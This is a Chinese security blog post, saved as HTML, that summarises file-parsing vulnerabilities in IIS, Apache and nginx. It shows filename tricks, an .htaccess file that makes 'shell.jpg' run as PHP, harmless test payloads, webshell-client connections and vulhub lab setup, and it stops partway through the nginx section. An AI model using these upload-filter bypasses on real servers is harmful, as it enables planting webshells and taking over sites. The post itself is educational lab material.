<!DOCTYPE html>
<html lang="zh-cn">
  <head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noodp"/>
  <meta name="author" content="Olist.213">
  <meta name="description" content="一点牢骚">
  
  
  <link rel="prev" href="https://olist213.github.io/posts/blackmail_virus/" />
  <link rel="next" href="https://olist213.github.io/posts/virus/" />
  <link rel="canonical" href="https://olist213.github.io/posts/parsing_vulnerability/" />
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>
       
       
           解析漏洞总结 | Olist.213
       
  </title>
  <meta name="title" content="解析漏洞总结 | Olist.213">
    
  
  <link rel="stylesheet" href="/font/iconfont.css">
  <link rel="stylesheet" href="/css/main.min.css">


  
  
 

<script type="application/ld+json">
 "@context" : "http://schema.org",
    "@type" : "BlogPosting",
    "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https:\/\/olist213.github.io"
    },
    "articleSection" : "posts",
    "name" : "解析漏洞总结",
    "headline" : "解析漏洞总结",
    "description" : "当我们访问web服务器时，如：www.test.com\/index.php文件时，向web服务器发出请求，访问php文件，php的解析器将php文件解析成静态文件，返回给浏览器供用户浏览。\n服务器解析漏洞就发生在浏览器向服务器上传文件时，服务器把攻击者恶意构造的文件进行解析，并返回给浏览器，从而达到上传恶意文件的目的。\n一、解析漏洞分类\n 0x01 IIS5.x\/6.0解析漏洞 IIS的解析方法有两种\n1、目录解析\n如果服务器上存在一个目录为xx.asp，那么在这个目录下的文件都会被解析成asp文件。\n2、文件解析\n通过菜刀进行连接即可连接成功。\nIIS6.0除了执行asp文件外，还可以执行如：asa、cer、cdx等文件后缀的文件。可结合目录解析漏洞进行利用。如：xxx.cer\/xxx.jpg,xxx.asa;.jpg。\n0x02 apache解析漏洞  1、多种后缀\napache对文件后缀的识别是从右往左进行解析，如：xxx.php.hcx.hts。会先判断右边的.hts后缀，发现这个后缀不正常，开始解析.hcx，最终解析到php文件，从而执行恶意文件。\n查看php的模块配置文件\/etc\/apache2\/mods-available\/php7.0.conf\n#从下面的FileMatch中可以看到\u0026#34;.\u002b.ph(p[3457]?|t|tml)$\u0026#34;，$代表最后一个，说明php本身 #还是检测最后一个后缀的 。  \u0026lt;FilesMatch \u0026#34;.\u002b.ph(p[3457]?|t|tml)$\u0026#34;\u0026gt; SetHandler application\/x-httpd-php \u0026lt;\/FilesMatch\u0026gt; \u0026lt;FilesMatch \u0026#34;.\u002b.phps$\u0026#34;\u0026gt; SetHandler application\/x-httpd-php-source # Deny access to raw php sources by default \t# To re-enable it\u0026#39;s recommended to enable access to the files \t# only in specific virtual host or directory \tRequire all denied \u0026lt;\/FilesMatch\u0026gt; Deny access to files without filename (e.",
    "inLanguage" : "zh-cn",
    "author" : "Olist.213",
    "creator" : "Olist.213",
    "publisher": "Olist.213",
    "accountablePerson" : "Olist.213",
    "copyrightHolder" : "Olist.213",
    "copyrightYear" : "2019",
    "datePublished": "2019-01-22 10:21:18 \u002b0800 CST",
    "dateModified" : "2019-01-22 10:21:18 \u002b0800 CST",
    "url" : "https:\/\/olist213.github.io\/posts\/parsing_vulnerability\/",
    "wordCount" : "502",
    "keywords" : [ "解析漏洞", "Olist.213"]
}
</script>

</head>

  


  <body class="">
    <div class="wrapper">
        <nav class="navbar">
    <div class="container">
        <div class="navbar-header header-logo">
        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
        </div>
        <div class="menu navbar-right">
                
                
                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/tags/" title="">Tags</a>
                
                <a class="menu-item" href="/about/" title="">About</a>
                
                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
                
                <a class="menu-item" href="/security_process/" title="">安全流程</a>
                
        </div>
    </div>
</nav>
<nav class="navbar-mobile" id="nav-mobile" style="display: none">
     <div class="container">
        <div class="navbar-header">
            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
            <div class="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
     
          <div class="menu" id="mobile-menu">
                
                
                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/tags/" title="">Tags</a>
                
                <a class="menu-item" href="/about/" title="">About</a>
                
                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
                
                <a class="menu-item" href="/security_process/" title="">安全流程</a>
                
        </div>
    </div>
</nav>
    	 <main class="main">
          <div class="container">
      		
<article class="post-warp" itemscope itemtype="http://schema.org/Article">
    <header class="post-header">
        <h1 class="post-title" itemprop="name headline">解析漏洞总结</h1>
        <div class="post-meta">
                Written by <a itemprop="name" href="https://olist213.github.io" rel="author">Olist.213</a> with ♥ 
                <span class="post-time">
                on <time datetime=2019-01-22 itemprop="datePublished">January 22, 2019</time>
                </span>
                in
                
        </div>
    </header>
    <div class="post-content">
        

        
            
        

        
        
     
          
          
          

          
          
          

          <p>当我们访问web服务器时，如：www.test.com/index.php文件时，向web服务器发出请求，访问php文件，php的解析器将php文件解析成静态文件，返回给浏览器供用户浏览。</p>
<p>服务器解析漏洞就发生在浏览器向服务器上传文件时，服务器把攻击者恶意构造的文件进行解析，并返回给浏览器，从而达到上传恶意文件的目的。</p>
<p><strong>一、解析漏洞分类</strong></p>
<hr>
<h2 id="0x01-iis5x60解析漏洞">0x01 IIS5.x/6.0解析漏洞</h2>
<p>IIS的解析方法有两种</p>
<p>1、目录解析</p>
<p>如果服务器上存在一个目录为xx.asp，那么在这个目录下的文件都会被解析成asp文件。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Snipaste_2019-01-22_10-26-09.jpg" alt="目录解析" title="解析成功"></p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Snipaste_2019-01-22_10-52-38.jpg" alt="连接成功" title="菜刀连接"></p>
<p>2、文件解析</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Snipaste_2019-01-22_10-56-20.jpg" alt="文件解析" title="文件解析"></p>
<p>通过菜刀进行连接即可连接成功。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Snipaste_2019-01-22_10-56-34.jpg" alt="连接成功" title="解析成功"></p>
<p>IIS6.0除了执行asp文件外，还可以执行如：asa、cer、cdx等文件后缀的文件。可结合目录解析漏洞进行利用。如：xxx.cer/xxx.jpg,xxx.asa;.jpg。</p>
<h2 id="0x02-apache解析漏洞">0x02 apache解析漏洞</h2>
<hr>
<p>1、多种后缀</p>
<p>apache对文件后缀的识别是从右往左进行解析，如：xxx.php.hcx.hts。会先判断右边的.hts后缀，发现这个后缀不正常，开始解析.hcx，最终解析到php文件，从而执行恶意文件。</p>
<p>查看php的模块配置文件/etc/apache2/mods-available/php7.0.conf</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">#从下面的FileMatch中可以看到&#34;.+.ph(p[3457]?|t|tml)$&#34;，$代表最后一个，说明php本身
</span><span style="color:#75715e">#还是检测最后一个后缀的 。
</span><span style="color:#75715e"></span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;.+.ph(p[3457]?|t|tml)$&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#a6e22e">SetHandler</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>

<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;.+.phps$&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#a6e22e">SetHandler</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span><span style="color:#f92672">-</span><span style="color:#a6e22e">source</span>
	<span style="color:#75715e"># Deny access to raw php sources by default
</span><span style="color:#75715e"></span>	<span style="color:#75715e"># To re-enable it&#39;s recommended to enable access to the files
</span><span style="color:#75715e"></span>	<span style="color:#75715e"># only in specific virtual host or directory
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">denied</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>

<span style="color:#a6e22e">Deny</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">files</span> <span style="color:#a6e22e">without</span> <span style="color:#a6e22e">filename</span> (<span style="color:#a6e22e">e</span><span style="color:#f92672">.</span><span style="color:#a6e22e">g</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php&#39;</span>)

<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;^.ph(p[3457]?|t|tml|ps)$&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">denied</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>

<span style="color:#a6e22e">Running</span> <span style="color:#a6e22e">PHP</span> <span style="color:#a6e22e">scripts</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">directories</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">disabled</span> <span style="color:#a6e22e">by</span> <span style="color:#66d9ef">default</span>
<span style="color:#a6e22e">To</span> <span style="color:#a6e22e">re</span><span style="color:#f92672">-</span><span style="color:#a6e22e">enable</span> <span style="color:#a6e22e">PHP</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">directories</span> <span style="color:#a6e22e">comment</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">following</span> <span style="color:#a6e22e">lines</span>
(<span style="color:#a6e22e">from</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IfModule</span> <span style="color:#f92672">...&gt;</span> <span style="color:#a6e22e">to</span> <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">IfModule</span><span style="color:#f92672">&gt;.</span>) <span style="color:#66d9ef">Do</span> <span style="color:#66d9ef">NOT</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">it</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">On</span> <span style="color:#66d9ef">as</span> <span style="color:#a6e22e">it</span>
<span style="color:#a6e22e">prevents</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">htaccess</span> <span style="color:#a6e22e">files</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">disabling</span> <span style="color:#a6e22e">it</span><span style="color:#f92672">.</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IfModule</span> <span style="color:#a6e22e">mod_userdir</span><span style="color:#f92672">.</span><span style="color:#a6e22e">c</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Directory</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">home</span><span style="color:#f92672">/*/</span><span style="color:#a6e22e">public_html</span><span style="color:#f92672">&gt;</span>
	<span style="color:#a6e22e">php_admin_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">Off</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">Directory</span><span style="color:#f92672">&gt;</span>

</code></pre></div><p>访问如下，php未解析，直接返回源代码：</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-867a771d-828d-46f1-971a-948933c0293a.png" alt="php文件未解析" title="Untitled-867a771d-828d-46f1-971a-948933c0293a"></p>
<p>接下来，我们将上述那段配置文件中18行的<code>$</code>改成<code>\.</code>线。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;.+\.ph(p[3457]?|t|tml)\.&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#a6e22e">SetHandler</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;.+\.phps\.&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#a6e22e">SetHandler</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span><span style="color:#f92672">-</span><span style="color:#a6e22e">source</span>
	<span style="color:#75715e"># Deny access to raw php sources by default
</span><span style="color:#75715e"></span>	<span style="color:#75715e"># To re-enable it&#39;s recommended to enable access to the files
</span><span style="color:#75715e"></span>	<span style="color:#75715e"># only in specific virtual host or directory
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">denied</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>
<span style="color:#75715e"># Deny access to files without filename (e.g. &#39;.php&#39;)
</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;^\.ph(p[3457]?|t|tml|ps)\.&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">denied</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>

<span style="color:#75715e"># Running PHP scripts in user directories is disabled by default
</span><span style="color:#75715e">#
</span><span style="color:#75715e"># To re-enable PHP in user directories comment the following lines
</span><span style="color:#75715e"># (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it
</span><span style="color:#75715e"># prevents .htaccess files from disabling it.
</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IfModule</span> <span style="color:#a6e22e">mod_userdir</span><span style="color:#f92672">.</span><span style="color:#a6e22e">c</span><span style="color:#f92672">&gt;</span>
	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Directory</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">home</span><span style="color:#f92672">/*/</span><span style="color:#a6e22e">public_html</span><span style="color:#f92672">&gt;</span>
		<span style="color:#a6e22e">php_admin_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">Off</span>
	<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">Directory</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">IfModule</span><span style="color:#f92672">&gt;</span>
</code></pre></div><p>重启apache服务。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">service apache2 restart
</code></pre></div><p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-6d33212d-4914-44dd-9825-115bc82cc907.png" alt="php文件解析成功" title="Untitled-6d33212d-4914-44dd-9825-115bc82cc907"></p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-03a088d9-3156-4409-aba5-79300a0fb90f.png" alt="php文件解析成功" title="Untitled-03a088d9-3156-4409-aba5-79300a0fb90f"></p>
<p>文件解析成功。</p>
<p>2、罕见后缀</p>
<p>apache会解析特定的mime类型的文件，在/etc/mime.types文件中定义了可以解析的文件后缀格式。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Snipaste_2019-01-22_11-05-43.jpg" alt="enter description here" title="Snipaste_2019-01-22_11-05-43"></p>
<p>如果站点的文件上传处，未对在mime.types文件中类型进行过滤，那么有可能攻击者可以通过上传apache解析的异类php文件后缀，从而绕过站点过滤器。</p>
<p>3、.htacesss文件</p>
<p>在网站根目录默认不存在.htaccess文件，需要自己建立，.htaccess内容如下</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">AddType</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">xxx</span>

<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;shell.jpg&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#a6e22e">SetHandler</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>
</code></pre></div><p>.htaccess功能默认是未开启的，访问结果如下：</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-16a7914d-6a09-485e-82c7-d60cea2f79c8.png" alt="enter description here" title="Untitled-16a7914d-6a09-485e-82c7-d60cea2f79c8"></p>
<p>编辑apache配置文件,将AllowOverride None改成AllowOverride All</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Directory</span> <span style="color:#f92672">/&gt;</span>
		<span style="color:#a6e22e">Options</span> <span style="color:#a6e22e">FollowSymLinks</span>
		<span style="color:#a6e22e">AllowOverride</span> <span style="color:#a6e22e">All</span>
		<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">denied</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">Directory</span><span style="color:#f92672">&gt;</span>

<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Directory</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">share</span><span style="color:#f92672">&gt;</span>
		<span style="color:#a6e22e">AllowOverride</span> <span style="color:#a6e22e">None</span>
		<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">granted</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">Directory</span><span style="color:#f92672">&gt;</span>

<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Directory</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/&gt;</span>
		<span style="color:#a6e22e">Options</span> <span style="color:#a6e22e">Indexes</span> <span style="color:#a6e22e">FollowSymLinks</span>
		<span style="color:#a6e22e">AllowOverride</span> <span style="color:#a6e22e">All</span>
		<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">granted</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">Directory</span><span style="color:#f92672">&gt;</span>

<span style="color:#75715e">#&lt;Directory /srv/&gt;
</span><span style="color:#75715e">#       Options Indexes FollowSymLinks
</span><span style="color:#75715e">#       AllowOverride None
</span><span style="color:#75715e">#       Require all granted
</span><span style="color:#75715e">#&lt;/Directory&gt;
</span></code></pre></div><p>并且将.ht开头的匹配改成granted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FilesMatch</span> <span style="color:#e6db74">&#34;^.ht&#34;</span><span style="color:#f92672">&gt;</span>
	<span style="color:#66d9ef">Require</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">granted</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">FilesMatch</span><span style="color:#f92672">&gt;</span>
</code></pre></div><p>加载rewrite模块，rewrite模块通过创建软连接的形式进行加载</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd /etc/apache2/mods-enabled/
ln -s ../mods-available/rewrite.load rewrite.load
</code></pre></div><p>如上，.htaccess功能已经开启。在网站根目录(/var/www/html)建立相应的测试文件。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:/var/www/html# tree
.
├── index.html
├── index.php
├── shell.jpg
├── test
	│ ├── shell.jpg
	│ └── <span style="color:#f92672">[</span>type.xxx<span style="color:#f92672">](</span>http://type.xxx/<span style="color:#f92672">)</span>
└── <span style="color:#f92672">[</span>type.xxx<span style="color:#f92672">](</span>http://type.xxx/<span style="color:#f92672">)</span>
</code></pre></div><p>shell.jpg和type.xxx的内容均为</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;HELLO WORLD&#39;</span>; <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>浏览器访问shell.jpg图片后缀和type.xxx的文件，直接执行了php代码文件。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-aaf0f969-8b08-4303-b865-434282deadd6.png" alt="php文件解析成功" title="Untitled-aaf0f969-8b08-4303-b865-434282deadd6"></p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-fcbf5c98-9797-4988-bc29-16aab12311d7.png" alt="解析成功" title="Untitled-fcbf5c98-9797-4988-bc29-16aab12311d7"></p>
<p>合理的利用.htaccess文件可以很好的绕过php后缀的过滤。</p>
<p><a href="https://blog.csdn.net/wn314/article/details/77074477">文件解析漏洞总结-Apache - CSDN博客</a></p>
<h2 id="0x03-nginx解析漏洞">0x03 nginx解析漏洞</h2>
<p>Nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。</p>
<p>Nginx在0.5.<em>, 0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37版本中曾被发现存在较为严重的安全问题，默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。</p>
<p>nginx漏洞环境搭建起来比较麻烦，还是直接用漏洞平台吧！</p>
<p>所以，就拿vulhub漏洞平台进行演示。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-4c473930-3b6e-47de-aa6a-441de4b18dde.png" alt="-_-" title="Untitled-4c473930-3b6e-47de-aa6a-441de4b18dde"></p>
<p><strong>vulhub项目地址：<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></strong></p>
<p>vulhub漏洞平台基于docker进行搭建，docker的好处是漏洞环境可以直接拉取下来，直接可以使用，不用自己重新去搭建环境。</p>
<p>1、安装docker</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># 安装pip</span>
curl -s https://bootstrap.pypa.io/get-pip.py | python3

<span style="color:#75715e"># 安装最新版docker</span>
curl -s https://get.docker.com/ | sh

<span style="color:#75715e"># 启动docker服务</span>
service docker start

<span style="color:#75715e"># 安装compose</span>
pip install docker-compose
</code></pre></div><p>2、vulhub用法</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># 拉取项目</span>
git clone https://github.com/vulhub/vulhub.git
cd vulhub

<span style="color:#75715e"># 进入某一个漏洞/环境的目录</span>
cd flask/ssti

<span style="color:#75715e"># 自动化编译环境</span>
docker-compose build

<span style="color:#75715e"># 启动整个环境</span>
docker-compose up -d
</code></pre></div><hr>
<p><strong>以上来自vulhub的readme</strong></p>
<p>注：启动环境时，注意系统时间的设置，如果时间不一致会报错。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Get https://registry-1.docker.io/v2/: x509: certificate has expired or is no
</code></pre></div><p>环境搭建完成。</p>
<hr>
<p>3、nginx解析原理</p>
<p>nginx解析漏洞与nginx、php版本无关，属于用户配置文件配置不当造成的，但在高版本的php中，引入了“security.limit_extensions”机制，默认只解析后缀为.php的文件。</p>
<p>nginx版本如下：</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-c297bec3-4b93-4317-a785-48af316fec2c.png" alt="nginx version" title="Untitled-c297bec3-4b93-4317-a785-48af316fec2c"></p>
<p>Nginx拿到一个<code>test.jpg/.php</code>的文件之后，看到url最后面的php文件后缀，便认为是php文件，交给php解析器进行处理，但php解析器未发现这个php文件，便去掉php后缀，取test.jpg，test.jpg存在但不是php文件而是图片文件，php解析器不解析，返回Access denied。</p>
<p>nginx解析漏洞有80sec组织发现的，当在fastcgi开启的情况下，攻击者上传一个jpg文件，测试内容如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">PHP</span> <span style="color:#a6e22e">phpinfo</span>() <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>然后访问<code>xxx.jpg/.php</code>文件，那么这个文件会解析成php文件。</p>
<p>此时，显示如下：</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-efa40c87-5bc3-49e1-9a1b-f6d631fd4fd7.png" alt="Access denied" title="Untitled-efa40c87-5bc3-49e1-9a1b-f6d631fd4fd7"></p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-c1558e7b-286c-4f14-aa35-de9131d16503.png" alt="Access denied" title="Untitled-c1558e7b-286c-4f14-aa35-de9131d16503"></p>
<p>显示<strong>Access denied</strong>。</p>
<p>这是因为在最新版的php.ini配置文件中，cgi.fix_pathinfo=1，默认为1，如果将cgi.fix_pathinof设置为0，那么就不解析后面的后缀了，解析漏洞也就不存在了。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-13ef9666-aaf6-4bc6-a82b-5be1cb9103d2.png" alt="php.ini" title="Untitled-13ef9666-aaf6-4bc6-a82b-5be1cb9103d2"></p>
<p>现在还解析不了，因为在新版本的php中引入了“security.limit_extensions”机制，限制了可执行文件的后缀。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># 查找php-fpm.conf文件
</span><span style="color:#75715e"></span>    
<span style="color:#75715e"># find / -name php-fpm.conf
</span><span style="color:#75715e"></span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">php</span><span style="color:#f92672">-</span><span style="color:#a6e22e">fpm</span><span style="color:#f92672">.</span><span style="color:#a6e22e">conf</span>
</code></pre></div><p>php-fpm.conf文件包含了<code>/etc/php-fpm.d/*.conf</code>目录下的文件配置。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-57d0b464-a716-4a02-8be7-501df8f32529.png" alt="*.conf" title="Untitled-57d0b464-a716-4a02-8be7-501df8f32529"></p>
<p>进入到/etc/php-fpm.d/目录下，编辑相应的配置文件，找到<code>security.limit_extensions</code>，添加gif后缀。</p>
